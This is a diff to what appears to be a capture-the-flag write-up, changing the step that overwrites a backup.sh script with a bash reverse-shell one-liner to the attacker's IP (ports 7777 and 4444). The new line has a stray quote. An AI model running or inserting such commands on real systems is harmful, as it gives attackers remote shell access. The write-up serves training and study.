@@ -289,7 +289,7 @@ i can see a file backup.sh
 
 ![image](https://user-images.githubusercontent.com/90561566/196370535-067416ec-cb43-40c1-bdcf-00471abc6069.png)
 
-change the file content to `bash -c 'exec bash -i &>/dev/tcp/<your_ip>/7777 <&1'`
+change the file content to `bash -i >& /dev/tcp/<your_ip>/4444 0>&1'`
 
 ![image](https://user-images.githubusercontent.com/90561566/196371436-d99633d1-b1f6-419b-97c9-6a08618fbf5d.png)
 
